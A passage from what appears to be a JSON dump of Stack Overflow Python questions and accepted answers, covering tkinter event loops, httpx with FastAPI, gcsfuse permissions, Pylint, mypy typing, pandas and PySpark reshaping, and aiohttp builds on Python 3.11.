    "Body": "I recently started to use tkwait casually and noticed that some functionality only works under special conditions. For example:\nimport tkinter as tk\n\ndef w(seconds):\n    dummy = tk.Toplevel(root)\n    dummy.title(seconds)\n    dummy.after(seconds*1000, lambda x=dummy: x.destroy())\n    dummy.wait_window(dummy)\n    print(seconds)\n\nroot = tk.Tk()\nfor i in [5,2,10]:\n    w(i)\nroot.mainloop()\n\nThe code above works just fine and as expected:\n\nThe for loop calls the function\nThe function runs and blocks the code for x seconds\nThe window gets destroyed and the for loop continues\n\nBut in a more event driven environment these tkwait calls gets tricky. The documentation states quote:\n\nIf an event handler invokes tkwait again, the nested call to tkwait\nmust complete before the outer call can complete.\n\nInstead of an output of >>5 >>2 >>10 you will get >>10 >>2 >>5 because the nested call blocks the inner and the outer will block the inner. I suspect a nested event loop or an equivalent of the mainloop processes events in the normal fashion while waiting.\nAm I doing something wrong by using this feature? Because if you think about it, nearly all tkinter dialog windows are using this feature and I've never read about this behavior before.\nAn event driven example might be:\nimport tkinter as tk\n\ndef w(seconds):\n    dummy = tk.Toplevel(root)\n    dummy.title(seconds)\n    dummy.after(seconds*1000, lambda x=dummy: x.destroy())\n    dummy.wait_window(dummy)\n    print(seconds)\n\nroot = tk.Tk()\nbtn1 = tk.Button(\n    root, command=lambda : w(5), text = '5 seconds')\nbtn2 = tk.Button(\n    root, command=lambda : w(2), text = '2 seconds')\nbtn3 = tk.Button(\n    root, command=lambda : w(10), text = '10 seconds')\nbtn1.pack()\nbtn2.pack()\nbtn3.pack()\nroot.mainloop()\n\nAs an additional problem that raises with wait_something is that it will prevent your process to finish if the wait_something never was released.\n",
    "AcceptedAnswerId": 74376258,
    "AcceptedAnswer": "Basically, you need great care if you're using an inner event loop because:\n\nConditions that would terminate the outer event loop aren't checked for until the inner event loop(s) are finished.\nIt's really quite easy to end up recursively entering an inner event loop by accident.\n\nThe recursive entry problem is usually most easily handled by disabling the path that enters the event loop while the inner event loop runs. There's often an obvious way to do this, such as disabling the button that you'd click.\nThe condition handling is rather more difficult. In Tcl, you'd handle it by restructuring things slightly using a coroutine so that the thing that looks like an inner event loop isn't, but rather is just parking things until the condition is satisfied. That option is... rather more difficult to do in Python as the language implementation isn't fully non-recursive (and I'm not sure that Tkinter is set up to handle the mess of async function coloring). Fortunately, provided you're careful, it's not too difficult.\nIt helps if you know that wait_window is waiting for a  event where the target window is the toplevel (and not one of the inner components) and that destroying the main window will trigger it as all the other windows are also destroyed when you do that. In short, as long as you avoid reentrancy you'll be fine with it. You just need to arrange for the button that was clicked to be disabled while the wait is ongoing; that's good from a UX perspective too (the user can't do it, so don't provide the visual hint that they can).\ndef w(seconds, button):\n    dummy = tk.Toplevel(root)\n    dummy.title(seconds)\n    dummy.after(seconds*1000, lambda x=dummy: x.destroy())\n    button[\"state\"] = \"disabled\"  # <<< This, before the wait\n    dummy.wait_window(dummy)\n    button[\"state\"] = \"normal\"    # <<< This, after the wait\n    print(seconds)\n\nbtn1 = tk.Button(root, text = '5 seconds')\n# Have to set the command after creation to bind the button handle to the callback\nbtn1[\"command\"] = (lambda : w(5, btn1))\n\nThis all omits little things like error handling.\n"
}
{
    "Id": 71031816,
    "PostTypeId": 1,
    "Title": "how do you properly reuse an httpx.AsyncClient wihtin a FastAPI application?",
    "Body": "I have a FastAPI application which, in several different occasions, needs to call external APIs. I use httpx.AsyncClient for these calls. The point is that I don't fully understand how I shoud use it.\nFrom httpx' documentation I should use context managers,\nasync def foo():\n    \"\"\"\"\n    I need to call foo quite often from different \n    parts of my application\n    \"\"\"\n    async with httpx.AsyncClient() as aclient:\n        # make some http requests, e.g.,\n        await aclient.get(\"http://example.it\")\n\nHowever, I understand that in this way a new client is spawned each time I call foo(), and is precisely what we want to avoid by using a client in the first place.\nI suppose an alternative would be to have some global client defined somewhere, and just import it whenever I need it like so\naclient = httpx.AsyncClient()\n\nasync def bar():\n    # make some http requests using the global aclient, e.g.,\n    await aclient.get(\"http://example.it\")\n\nThis second option looks somewhat fishy, though, as nobody is taking care of closing the session and the like.\nSo the question is: how do I properly (re)use httpx.AsyncClient() within a FastAPI application?\n",
    "AcceptedAnswerId": 74397436,
    "AcceptedAnswer": "You can have a global client that is closed in the FastApi shutdown event.\nimport logging\nfrom fastapi import FastAPI\nimport httpx\n\nlogging.basicConfig(level=logging.INFO, format=\"%(levelname)-9s %(asctime)s - %(name)s - %(message)s\")\nLOGGER = logging.getLogger(__name__)\n\n\nclass HTTPXClientWrapper:\n\n    async_client = None\n\n    def start(self):\n        \"\"\" Instantiate the client. Call from the FastAPI startup hook.\"\"\"\n        self.async_client = httpx.AsyncClient()\n        LOGGER.info(f'httpx AsyncClient instantiated. Id {id(self.async_client)}')\n\n    async def stop(self):\n        \"\"\" Gracefully shutdown. Call from FastAPI shutdown hook.\"\"\"\n        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed} - Now close it. Id (will be unchanged): {id(self.async_client)}')\n        await self.async_client.aclose()\n        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed}. Id (will be unchanged): {id(self.async_client)}')\n        self.async_client = None\n        LOGGER.info('httpx AsyncClient closed')\n\n    def __call__(self):\n        \"\"\" Calling the instantiated HTTPXClientWrapper returns the wrapped singleton.\"\"\"\n        # Ensure we don't use it if not started / running\n        assert self.async_client is not None\n        LOGGER.info(f'httpx async_client.is_closed(): {self.async_client.is_closed}. Id (will be unchanged): {id(self.async_client)}')\n        return self.async_client\n\n\nhttpx_client_wrapper = HTTPXClientWrapper()\napp = FastAPI()\n\n\n@app.get('/test-call-external')\nasync def call_external_api(url: str = 'https://stackoverflow.com'):\n    async_client = httpx_client_wrapper()\n    res = await async_client.get(url)\n    result = res.text\n    return {\n        'result': result,\n        'status': res.status_code\n    }\n\n\n@app.on_event(\"startup\")\nasync def startup_event():\n    httpx_client_wrapper.start()\n\n\n@app.on_event(\"shutdown\")\nasync def shutdown_event():\n    await httpx_client_wrapper.stop()\n\n\nif __name__ == '__main__':\n    import uvicorn\n    LOGGER.info(f'starting...')\n    uvicorn.run(f\"{__name__}:app\", host=\"127.0.0.1\", port=8000)\n\n\n\nNote - this answer was inspired by a similar answer I saw elsewhere a long time ago for aiohttp, I can't find the reference but thanks to whoever that was!\nEDIT\nI've added uvicorn bootstrapping in the example so that it's now fully functional. I've also added logging to show what's going on on startup and shutdown, and you can visit localhost:8000/docs to trigger the endpoint and see what happens (via the logs).\nThe reason for calling the start() method from the startup hook is that by the time the hook is called the eventloop has already started, so we know we will be instantiating the httpx client in an async context.\nAlso I was missing the async on the stop() method, and had a self.async_client = None instead of just async_client = None, so I have fixed those errors in the example.\n"
}
{
    "Id": 73722570,
    "PostTypeId": 1,
    "Title": "Unable to write files in a GCP bucket using gcsfuse",
    "Body": "I have mounted a storage bucket on a VM using the command:\ngcsfuse my-bucket /path/to/mount\n\nAfter this I'm able to read files from the bucket in Python using Pandas, but I'm not able to write files nor create new folders. I have tried with Python and from the terminal using sudo but get the same error.\nI have also tried Using the key_file from the bucket:\nsudo mount -t gcsfuse -o implicit_dirs,allow_other,uid=1000,gid=1000,key_file=Notebooks/xxxxxxxxxxxxxx10b3464a1aa9.json  \n\nIt does not through errors when I run the code, but still I'm not able to write in the bucket.\nI have also tried:\ngcloud auth login\n\nBut still have the same issue.\n",
    "AcceptedAnswerId": 73764622,
    "AcceptedAnswer": "I ran into the same thing a while ago, which was really confusing. You have to set the correct access scope for the virtual machine so that anyone using the VM is able to call the storage API. The documentation shows that the default access scope for storage on a VM is read-only:\n\nWhen you create a new Compute Engine instance, it is automatically\nconfigured with the following access scopes:\n\nRead-only access to Cloud Storage:\nhttps://www.googleapis.com/auth/devstorage.read_only\n\n\nAll you have to do is change this scope so that you are also able to write to storage buckets from the VM. You can find an overview of different scopes here. To apply the new scope to your VM, you have to first shut it down. Then from your local machine execute the following command:\ngcloud compute instances set-scopes INSTANCE_NAME \\\n  --scopes=storage-rw \\\n  --zone=ZONE\n\nYou can do the same thing from the portal if you go to the settings of your VM, scroll all the way down, and choose \"Set Access for each API\". You have the same options when you create the VM for the first time. Below is an example of how you would do this:\n\n"
}
{
    "Id": 73572941,
    "PostTypeId": 1,
    "Title": "Writing style to prevent string concatenation in a list of strings",
    "Body": "Suppose I have a list/tuple of strings,\nCOLOURS = [\n    \"White\",\n    \"Black\",\n    \"Red\"\n    \"Green\",\n    \"Blue\"\n]\n\nfor c in COLOURS:\n    # rest of the code\n\nSometimes I forget placing a comma after each entry in the list (\"Red\" in the above snippet). This results in one \"RedGreen\" instead of two separate \"Red\" and \"Green\" list items.\nSince this is valid Python, no IDE/text editor shows a warning/error. The incorrect value comes to the limelight only during testing.\nWhat writing style or code structure should I use to prevent this?\n",
    "AcceptedAnswerId": 73588070,
    "AcceptedAnswer": "You're incorrect that \"no IDE/text editor shows a warning/error\". Pylint can identify this problem using rule implicit-str-concat (W1404) with flag check-str-concat-over-line-jumps. (And for that matter, there are lots of things that are valid Python that a linter will warn you about, like bare except: for example.)\nPersonally, I'm using VSCode, so I enabled Pylint via the Python extension (python.linting.pylintEnabled) and set up a pylintrc like this:\n[tool.pylint]\ncheck-str-concat-over-line-jumps = yes\n\nNow VSCode gives this warning for your list:\n\nImplicit string concatenation found in list\u00a0 pylint(implicit-str-concat)\u00a0 [Ln 4, Col 1]\n\n\nLastly, there are probably other linters that can find the same problem, but Pylint is the first one I found.\n"
}
{
    "Id": 73603289,
    "PostTypeId": 1,
    "Title": "Why doesn't parameter type \"Dict[str, Union[str, int]]\" accept value of type \"Dict[str, str]\" (mypy)",
    "Body": "I have a type for a dictionary of variables passed to a template:\nVariablesDict = Dict[str, Union[int, float, str, None]]\n\nBasically, any dictionary where the keys are strings and the values are strings, numbers or None. I use this type in several template related functions.\nTake this example function:\ndef render_template(name: str, variables: VariablesDict):\n    ...\n\nCalling this function with a dictionary literal works fine:\nrender_template(\"foo\", {\"key\": \"value\"})\n\nHowever, if I assign the dictionary to a variable first, like this:\nvariables = {\"key\": \"value\"}\n\nrender_template(\"foo\", variables)\n\nMypy gives an error:\n\nArgument 2 to \"render_template\" has incompatible type \"Dict[str, str]\"; expected \"Dict[str, Union[int, float, str, None]]\"\n\nIt seems to me that any value of type Dict[str, str] should be safe to pass to a function that expects a parameter of type Dict[str, Union[int, float, str, None]]. Why doesn't that work by default? Is there anything I can do to make this work?\n",
    "AcceptedAnswerId": 73603324,
    "AcceptedAnswer": "The reason it doesn't work is that Dict is mutable, and a function which accepts a Dict[str, int|float|str|None] could therefore reasonably insert any of those types into its argument.  If the argument was actually a Dict[str, str], it now contains values that violate its type.  (For more on this, google \"covariance/contravariance/invariance\" and \"Liskov Substitution Principle\" -- as a general rule, mutable containers are invariant over their generic type[s].)\nAs long as render_template doesn't need to modify the dict you pass to it, an easy fix is to have it take a Mapping (which is an abstract supertype of dict that doesn't imply mutability, and is therefore covariant) instead of a Dict:\ndef render_template(name: str, variables: Mapping[str, Union[int, float, str, None]]):\n    ...\n\n"
}
{
    "Id": 74401537,
    "PostTypeId": 1,
    "Title": "Pandas groupby two columns and expand the third",
    "Body": "I have a Pandas dataframe with the following structure:\nA       B       C\na       b       1\na       b       2\na       b       3\nc       d       7\nc       d       8\nc       d       5\nc       d       6\nc       d       3\ne       b       4\ne       b       3\ne       b       2\ne       b       1\n\nAnd I will like to transform it into this:\nA       B       C1      C2      C3      C4      C5\na       b       1       2       3       NAN     NAN\nc       d       7       8       5       6       3\ne       b       4       3       2       1       NAN\n\nIn other words, something like groupby A and B and expand C into different columns.\nKnowing that the length of each group is different.\nC is already ordered\nShorter groups can have NAN or NULL values (empty), it does not matter.\n",
    "AcceptedAnswerId": 74401567,
    "AcceptedAnswer": "Use GroupBy.cumcount and pandas.Series.add with 1, to start naming the new columns from 1 onwards, then pass this to DataFrame.pivot, and add DataFrame.add_prefix to rename the columns (C1, C2, C3, etc...). Finally use DataFrame.rename_axis to remove the indexes original name ('g') and transform the MultiIndex into columns by using DataFrame.reset_indexcolumns A,B:\ndf['g'] = df.groupby(['A','B']).cumcount().add(1)\n\ndf = df.pivot(['A','B'], 'g', 'C').add_prefix('C').rename_axis(columns=None).reset_index()\nprint (df)\n   A  B   C1   C2   C3   C4   C5\n0  a  b  1.0  2.0  3.0  NaN  NaN\n1  c  d  7.0  8.0  5.0  6.0  3.0\n2  e  b  4.0  3.0  2.0  1.0  NaN\n\nBecause NaN is by default of type float, if you need the columns dtype to be integers add DataFrame.astype with Int64:\ndf['g'] = df.groupby(['A','B']).cumcount().add(1)\n\ndf = (df.pivot(['A','B'], 'g', 'C')\n        .add_prefix('C')\n        .astype('Int64')\n        .rename_axis(columns=None)\n        .reset_index())\nprint (df)\n   A  B  C1  C2  C3    C4    C5\n0  a  b   1   2   3    \n1  c  d   7   8   5     6     3\n2  e  b   4   3   2     1  \n\nEDIT: If there's a maximum N new columns to be added, it means that A,B are duplicated. Therefore, it will beneeded to add helper groups g1, g2 with integer and modulo division, adding a new level in index:\nN = 4\ng  = df.groupby(['A','B']).cumcount()\ndf['g1'], df['g2'] = g // N, (g % N) + 1\ndf = (df.pivot(['A','B','g1'], 'g2', 'C')\n        .add_prefix('C')\n        .droplevel(-1)\n        .rename_axis(columns=None)\n        .reset_index())\nprint (df)\n   A  B   C1   C2   C3   C4\n0  a  b  1.0  2.0  3.0  NaN\n1  c  d  7.0  8.0  5.0  6.0\n2  c  d  3.0  NaN  NaN  NaN\n3  e  b  4.0  3.0  2.0  1.0 \n\n"
}
{
    "Id": 73739552,
    "PostTypeId": 1,
    "Title": "Select columns from a highly nested data",
    "Body": "For the dataframe below, which was generated from an avro file, I'm trying to get the column names as a list or other format so that I can use it in a select statement. node1 and node2 have the same elements. For example I understand that we could do df.select(col('data.node1.name')), but I'm not sure\n\nhow to select all columns at once without hardcode all the column names, and\nhow to handle the nested part. I think to make it readable, the productvalues and porders should be selected into separate individual dataframes/tables?\n\nInput schema:\nroot\n  |-- metadata: struct\n  |...\n  |-- data :struct \n  |    |--node1 : struct\n  |    |   |--name : string\n  |    |   |--productlist: array\n  |    |        |--element : struct\n       |              |--productvalues: array\n       |                   |--element : struct\n       |                         |-- pname:string\n       |                         |-- porders:array\n       |                                |--element : struct\n       |                                      |-- ordernum: int\n       |                                      |-- field: string\n       |--node2 : struct\n  |        |--name : string\n  |        |--productlist: array\n  |             |--element : struct\n                      |--productvalues: array\n                          |--element : struct\n                                 |-- pname:string\n                                 |-- porders:array\n                                        |--element : struct\n                                              |-- ordernum: int\n                                              |-- field: string\n\n",
    "AcceptedAnswerId": 73784939,
    "AcceptedAnswer": "The following way, you will not need to hardcode all the struct fields. But you will need to provide a list of those columns/fields which have the type of array of struct. You have 3 of such fields, we will add one more column, so in total it will be 4.\nFirst of all, the dataframe, similar to yours:\nfrom pyspark.sql import functions as F\n\ndf = spark.createDataFrame(\n    [(\n        ('a', 'b'),\n        (\n            (\n                'name_1',\n                [\n                    ([\n                        (\n                            'pname_111',\n                            [\n                                (1111, 'field_1111'),\n                                (1112, 'field_1112')\n                            ]\n                        ),\n                        (\n                            'pname_112',\n                            [\n                                (1121, 'field_1121'),\n                                (1122, 'field_1122')\n                            ]\n                        )\n                    ],),\n                    ([\n                        (\n                            'pname_121',\n                            [\n                                (1211, 'field_1211'),\n                                (1212, 'field_1212')\n                            ]\n                        ),\n                        (\n                            'pname_122',\n                            [\n                                (1221, 'field_1221'),\n                                (1222, 'field_1222')\n                            ]\n                        )\n                    ],)\n                ]\n            ),\n            (\n                'name_2',\n                [\n                    ([\n                        (\n                            'pname_211',\n                            [\n                                (2111, 'field_2111'),\n                                (2112, 'field_2112')\n                            ]\n                        ),\n                        (\n                            'pname_212',\n                            [\n                                (2121, 'field_2121'),\n                                (2122, 'field_2122')\n                            ]\n                        )\n                    ],),\n                    ([\n                        (\n                            'pname_221',\n                            [\n                                (2211, 'field_2211'),\n                                (2212, 'field_2212')\n                            ]\n                        ),\n                        (\n                            'pname_222',\n                            [\n                                (2221, 'field_2221'),\n                                (2222, 'field_2222')\n                            ]\n                        )\n                    ],)\n                ]\n            )\n        ),\n    )],\n    'metadata:struct, data:struct>>>>>>, node2:struct>>>>>>>'\n)\n\n# df.printSchema()\n# root\n#  |-- metadata: struct (nullable = true)\n#  |    |-- fld1: string (nullable = true)\n#  |    |-- fld2: string (nullable = true)\n#  |-- data: struct (nullable = true)\n#  |    |-- node1: struct (nullable = true)\n#  |    |    |-- name: string (nullable = true)\n#  |    |    |-- productlist: array (nullable = true)\n#  |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |-- productvalues: array (nullable = true)\n#  |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |-- pname: string (nullable = true)\n#  |    |    |    |    |    |    |-- porders: array (nullable = true)\n#  |    |    |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |    |    |-- ordernum: integer (nullable = true)\n#  |    |    |    |    |    |    |    |    |-- field: string (nullable = true)\n#  |    |-- node2: struct (nullable = true)\n#  |    |    |-- name: string (nullable = true)\n#  |    |    |-- productlist: array (nullable = true)\n#  |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |-- productvalues: array (nullable = true)\n#  |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |-- pname: string (nullable = true)\n#  |    |    |    |    |    |    |-- porders: array (nullable = true)\n#  |    |    |    |    |    |    |    |-- element: struct (containsNull = true)\n#  |    |    |    |    |    |    |    |    |-- ordernum: integer (nullable = true)\n#  |    |    |    |    |    |    |    |    |-- field: string (nullable = true)\n\nThe answer\n\nSpark 3.1+\nnodes = df.select(\"data.*\").columns\nfor n in nodes:\n    df = df.withColumn(\"data\", F.col(\"data\").withField(n, F.struct(F.lit(n).alias(\"node\"), f\"data.{n}.*\")))\ndf = df.withColumn(\"data\", F.array(\"data.*\"))\n\nfor arr_of_struct in [\"data\", \"productlist\", \"productvalues\", \"porders\"]:\n    df = df.select(\n        *[c for c in df.columns if c != arr_of_struct],\n        F.expr(f\"inline({arr_of_struct})\")\n    )\n\n\nLower Spark versions:\nnodes = df.select(\"data.*\").columns\nfor n in nodes:\n    df = df.withColumn(\n        \"data\",\n        F.struct(\n            F.struct(F.lit(n).alias(\"node\"), f\"data.{n}.*\").alias(n),\n            *[f\"data.{c}\" for c in df.select(\"data.*\").columns if c != n]\n        )\n    )\ndf = df.withColumn(\"data\", F.array(\"data.*\"))\n\nfor arr_of_struct in [\"data\", \"productlist\", \"productvalues\", \"porders\"]:\n    df = df.select(\n        *[c for c in df.columns if c != arr_of_struct],\n        F.expr(f\"inline({arr_of_struct})\")\n    )\n\n\n\nResults:\ndf.printSchema()\n# root\n#  |-- metadata: struct (nullable = true)\n#  |    |-- fld1: string (nullable = true)\n#  |    |-- fld2: string (nullable = true)\n#  |-- node: string (nullable = false)\n#  |-- name: string (nullable = true)\n#  |-- pname: string (nullable = true)\n#  |-- ordernum: integer (nullable = true)\n#  |-- field: string (nullable = true)\n\ndf.show()\n# +--------+-----+------+---------+--------+----------+\n# |metadata| node|  name|    pname|ordernum|     field|\n# +--------+-----+------+---------+--------+----------+\n# |  {a, b}|node1|name_1|pname_111|    1111|field_1111|\n# |  {a, b}|node1|name_1|pname_111|    1112|field_1112|\n# |  {a, b}|node1|name_1|pname_112|    1121|field_1121|\n# |  {a, b}|node1|name_1|pname_112|    1122|field_1122|\n# |  {a, b}|node1|name_1|pname_121|    1211|field_1211|\n# |  {a, b}|node1|name_1|pname_121|    1212|field_1212|\n# |  {a, b}|node1|name_1|pname_122|    1221|field_1221|\n# |  {a, b}|node1|name_1|pname_122|    1222|field_1222|\n# |  {a, b}|node2|name_2|pname_211|    2111|field_2111|\n# |  {a, b}|node2|name_2|pname_211|    2112|field_2112|\n# |  {a, b}|node2|name_2|pname_212|    2121|field_2121|\n# |  {a, b}|node2|name_2|pname_212|    2122|field_2122|\n# |  {a, b}|node2|name_2|pname_221|    2211|field_2211|\n# |  {a, b}|node2|name_2|pname_221|    2212|field_2212|\n# |  {a, b}|node2|name_2|pname_222|    2221|field_2221|\n# |  {a, b}|node2|name_2|pname_222|    2222|field_2222|\n# +--------+-----+------+---------+--------+----------+\n\nExplanation\nnodes = df.select(\"data.*\").columns\nfor n in nodes:\n    df = df.withColumn(\"data\", F.col(\"data\").withField(n, F.struct(F.lit(n).alias(\"node\"), f\"data.{n}.*\")))\n\nUsing the above, I decided to save the node title in case you need it.\nIt first gets a list of nodes from \"data\" column fields. Using the list, the for loop creates one more field inside every node struct for the title of the node.\ndf = df.withColumn(\"data\", F.array(\"data.*\"))\n\nThe above converts the \"data\" column type from struct to array so that in the next step we could easily explode it into columns.\nfor arr_of_struct in [\"data\", \"productlist\", \"productvalues\", \"porders\"]:\n    df = df.select(\n        *[c for c in df.columns if c != arr_of_struct],\n        F.expr(f\"inline({arr_of_struct})\")\n    )\n\nIn the above, the main line is F.expr(f\"inline({arr_of_struct})\"). It must be used inside a loop, because it's a generator and you cannot nest them together in Spark. inline explodes arrays of structs into columns. At this step you have 4 of [array of struct], so 4 inline expressions will be created.\n"
}
{
    "Id": 74405180,
    "PostTypeId": 1,
    "Title": "Why cpython exposes 'PyTuple_SetItem' as C-API if tuple is immutable by design?",
    "Body": "Tuple in python is immutable by design, so if we try to mutate a tuple object python emits following TypeError which make sense.\n>>> a = (1, 2, 3)\n>>> a[0] = 12\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: 'tuple' object does not support item assignment\n\nSo my question is, if tuple is immutable by design why cpython exposes PyTuple_SetItem as C-API?.\nFrom the documentation it's described as\n\nint PyTuple_SetItem(PyObject *p, Py_ssize_t pos, PyObject *o)\nInsert a reference to object o at position pos of the tuple pointed to\nby p. Return 0 on success. If pos is out of bounds, return -1 and set\nan IndexError exception.\n\nIsn't this statement exactly equal to tuple[index] = value in python layer?. If the goal was to create a tuple from collection of items we could have use PyTuple_Pack.\nAdditional note:\nAfter lot of trial and error with ctypes.pythonapi I managed to mutate tuple object using PyTuple_SetItem\nimport ctypes\n\nfrom ctypes import py_object\n\nmy_tuple = (1, 2, 3)\nnewObj = py_object(my_tuple)\n\nm = \"hello\"\n\n# I don't know why I need to Py_DecRef here. \n# Although to reproduce this in your system,  no of times you have \n# to do `Py_DecRef` depends on no of ref count of `newObj` in your system\nctypes.pythonapi.Py_DecRef(newObj)\nctypes.pythonapi.Py_DecRef(newObj)\nctypes.pythonapi.Py_DecRef(newObj)\n\nctypes.pythonapi.Py_IncRef(m)\n\n\n\nPyTuple_SetItem = ctypes.pythonapi.PyTuple_SetItem\nPyTuple_SetItem.argtypes = ctypes.py_object, ctypes.c_size_t, ctypes.py_object\n\nPyTuple_SetItem(newObj, 0, m)\nprint(my_tuple) # this will print `('hello', 2, 3)`\n\n",
    "AcceptedAnswerId": 74405544,
    "AcceptedAnswer": "Similarly, there is a PyTuple_Resize function with the warning\n\nBecause tuples are supposed to be immutable, this should only be used\nif there is only one reference to the object. Do not use this if the\ntuple may already be known to some other part of the code. The tuple\nwill always grow or shrink at the end. Think of this as destroying the\nold tuple and creating a new one, only more efficiently.\n\nLooking at the source, there is a guard on the function\nif (!PyTuple_Check(op) || Py_REFCNT(op) != 1) {\n    .... error ....\n\nSure enough, this is only allowed when there is only 1 reference to the tuple - that reference being the thing that thinks its a good idea to change it. So, a tuple is \"mostly immutable\" but C code can change it in limited circumstances to avoid the penalty of creating a new tuple.\n"
}
{
    "Id": 74550830,
    "PostTypeId": 1,
    "Title": "ERROR: Could not build wheels for aiohttp, which is required to install pyproject.toml-based projects",
    "Body": "Python version: 3.11\nInstalling dependencies for an application by pip install -r requirements.txt gives the following error:\nsocket.c -o build/temp.linux-armv8l-cpython-311/aiohttp/_websocket.o\naiohttp/_websocket.c:198:12: fatal error: 'longintrepr.h' file not found\n#include \"longintrepr.h\"                                   \n          ^~~~~~~                        1 error generated.\nerror: command '/data/data/com.termux/files/usr/bin/arm-linux-androideabi-clang' \nfailed with exit code 1\n[end of output]\nnote: This error originates from a subprocess, and is likely not a problem with pip.\nERROR: Failed building wheel for aiohttp\nFailed to build aiohttp\nERROR: Could not build wheels for aiohttp, which is required to install\npyproject.toml-based projects\n\nThis error is specific to Python 3.11 version. On Python with 3.10.6 version installation goes fine.\nRelated question: yarl/_quoting.c:196:12: fatal error: 'longintrepr.h' file not found - 1 error generated\n",
    "AcceptedAnswerId": 74550831,
    "AcceptedAnswer": "Solution for this error: need to update requirements.txt.\nNot working versions of modules with Python 3.11:\naiohttp==3.8.1\nyarl==1.4.2\nfrozenlist==1.3.0\n\nWorking versions:\naiohttp==3.8.2\nyarl==1.8.1\nfrozenlist==1.3.1\n\nLinks to the corresponding issues with fixes:\n\nhttps://github.com/aio-libs/aiohttp/issues/6600\nhttps://github.com/aio-libs/yarl/issues/706\nhttps://github.com/aio-libs/frozenlist/issues/305\n\n"
}
{
    "Id": 73711633,
    "PostTypeId": 1,
    "Title": "How to calculate and store results based upon the Matching Rows of two different Pandas Dataframes in Python",
    "Body": "I have three DataFrames which I am importing from Excel Files.\nThe dataframes are given below as HTML Tables,\nSeason Wise Record (this contains a Column Reward which is initialized with 0 initially)\n\r\n\r\nUnnamed: 0NameTeamPositionGames PlayedPassingCompletionsPassingYardsPassingTouchdownsRushingYardsRushingTouchdownsReceivingYardsReceptionsTouchdownsTypeSacksSoloTacklesTacklesForLossFumblesForcedDefensiveTouchdownsInterceptionsPassesDefendedReceivingTouchdownsReward0Tom BradyTAMQB17485531643812002OFFENSE0000000001Justin HerbertLACQB174435014383023003OFFENSE0100000002Matthew StaffordLARQB17404488641430000OFFENSE0000000003Patrick MahomesKANQB174364839373812002OFFENSE0100000004Derek CarrLVRQB174284804231080000OFFENSE0000000005Joe BurrowCINQB163664611341182002OFFENSE0100000006Dak PrescottDALQB164104449371461001OFFENSE0000000007Josh AllenBUFQB174094407367636006OFFENSE01000000088Ezekiel ElliottDALRB171401002102874712OFFENSE01000002089Marcus MariotaLVRQB10140871001OFFENSE00000000090Johnny HekkerLARQB1712000000OFFENSE00000000091Greg WardPHIQB17120009573OFFENSE00000003092Kendall HintonDENWR1611000175151OFFENSE01000001093Keenan AllenLACWR160000011381066OFFENSE01000006094Danny AmendolaHOUQB800000248243OFFENSE01000003095Cole BeasleyBUFWR1600000693821OFFENSE000000010\r\n\r\n\r\n\nGame Wise Record (I am only adding some  sample rows, there are 20k+ rows in it)\n\r\n\r\nIndexWeekNameTeamStarterInterceptionsPassesDefendedSacksSoloTacklesTacklesForLossFumblesForcedPassesCompletionsPassingYardsPassingTouchdownsPassingInterceptionsRushingYardsRushingTouchdownsReceptionsReceivingYardsReceivingTouchdowns01Jourdan LewisDAL112000000000000011Trevon DiggsDAL112010000000000021Anthony BrownDAL100060000000000031Jayron KearseDAL000050000000000041Micah ParsonsDAL101030000000000051Keanu NealDAL100030000000000061DeMarcus LawrenceDAL100040100000000071Jaylon SmithDAL000020000000000081Dorance Armstrong Jr.DAL000000000000000091Tarell BashamDAL000000000000000051755Patrick MahomesKAN1000000332722261000051765Darrel WilliamsKAN00000000000270318051775Tyreek HillKAN10000000000150763051785Clyde Edwards-HelaireKAN10000000000130111051795Jerick McKinnonKAN0000000000020213051805Michael BurtonKAN000000000002000051815Mecole HardmanKAN1000000000000976051825Travis KelceKAN10000000000006571\r\n\r\n\r\n\nAnd lastly, there's a Player Goals File (this is an Excel File containing Sheets for each of the position, I am only sharing for QB sheet, to keep the question short. IF needed, I can share the rest too)\n\r\n\r\nGoalGoal TypePCC RewardTargetMin ValueMax ValueGames RequiredStartedLevel 99 PCC Reward x4 (current series)TImes achievedPCC Rewarded Throw 300-399 ydsGame25PassingYards300399001008200 Throw 400-499 ydsGame50PassingYards4004990020052501000Throw 500+ ydsGame150PassingYards5009999900600 00Throw 2 TDsGame50Touchdowns220020094501800Throw 3 TDsGame75Touchdowns330030043001200Throw 4 TDsGame100Touchdowns44004002200800Throw 5+ TDsGame300Touchdowns510000001200 0030-39 CompletionsGame50PassingCompletions3039002005250100040+ CompletionsGame200PassingCompletions4099990080012008000 INTs (must have been designated starter)Game200PassingInterceptions00018007140056003500-3999 Passing YDsSeason500PassingYards35003999002000 004000-4999 Passing YDSSeason750PassingYards40004999003000 005000+ Passing YDSSeason1250PassingYards500099999005000 0030-39 Passing TDSSeason750PassingTouchdowns3039003000 0040-45 Passing TDSSeason1250PassingTouchdowns4049005000 0050+ Passing TDSSeason2000PassingTouchdowns5099999008000 00\r\n\r\n\r\n\nWhat I want to do is analyze the Records of the Season Wise Records and the Game Wise Records, and based upon the Goals given in the Player Goals File, I want to add the Reward for all the players.\nThis is player position dependent so I made the following function to calculate Rewards for all the players (for the Season Records only)\ndef calculatePointsSeason(target, min_value, games_played_condition, max_value, tier_position, player_position, reward, games_played):\n    if player_position in positions[tier_position]:\n        if games_played > games_played_condition:\n            if target >= min_value and target <= max_value:\n                return reward \n    return 0 \n\nSimilarly, I made this function to calculate Game wise Record,\ndef calculatePointsGame(target, min_value, max_value, tier_position, player_position, reward, started, started_condition):\n    if player_position in positions[tier_position]:\n        if started == started_condition:\n            if target >= min_value and target <= max_value:\n                return reward \n    return 0 \n\nFollowing is the function in which I am applying these two functions to calculate the Reward for each player,\nfor key, value in positions.items(): # Positions has a list of all the positions \n    for (idx, row) in rewards[key].iterrows(): # Rewards is a Dict containing Pandas Dataframes against each position\n        if row['Goal Type'] == 'Season':\n            df = df.copy(deep=True) # df contains the Season Wise Record Dataframe\n            df['Reward'] += df.apply(lambda x: calculatePointsSeason(x[row['Target']], row['Min Value'], row['Games Required'],\n                                                               row['Max Value'], key, x['Position'],\n                                                                row['PCC Reward'], x['Games Played']), axis=1)\n        else: # For Game wise 